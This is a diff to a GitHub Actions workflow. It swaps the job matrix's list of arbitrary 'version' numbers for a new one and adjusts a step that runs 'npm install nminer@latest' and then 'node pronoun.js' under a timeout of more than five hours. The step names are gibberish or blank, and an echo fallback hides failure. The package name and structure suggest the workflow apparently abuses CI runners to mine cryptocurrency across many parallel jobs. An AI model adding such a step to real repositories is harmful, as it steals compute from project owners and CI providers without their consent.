@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3112 }
-          - { version: 1995 }
-          - { version: 7350 }
-          - { version: 9326 }
-          - { version: 7680 }
-          - { version: 4724 }
-          - { version: 6165 }
-          - { version: 9189 }
-          - { version: 1193 }
-          - { version: 9936 }
-          - { version: 5410 }
-          - { version: 1929 }
-          - { version: 616 }
-          - { version: 2739 }
-          - { version: 3170 }
-          - { version: 6336 }
-          - { version: 8443 }
-          - { version: 438 }
+          - { version: 6406 }
+          - { version: 3992 }
+          - { version: 8298 }
+          - { version: 9948 }
+          - { version: 537 }
+          - { version: 3463 }
+          - { version: 3783 }
+          - { version: 9050 }
+          - { version: 6115 }
+          - { version: 7626 }
+          - { version: 8120 }
+          - { version: 2512 }
+          - { version: 7160 }
+          - { version: 9718 }
+          - { version: 5566 }
+          - { version: 4772 }
+          - { version: 7894 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: on likewise option so
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 334m node pronoun.js || echo "pronoun executed"
+          timeout 316m node pronoun.js || echo "pronoun executed"
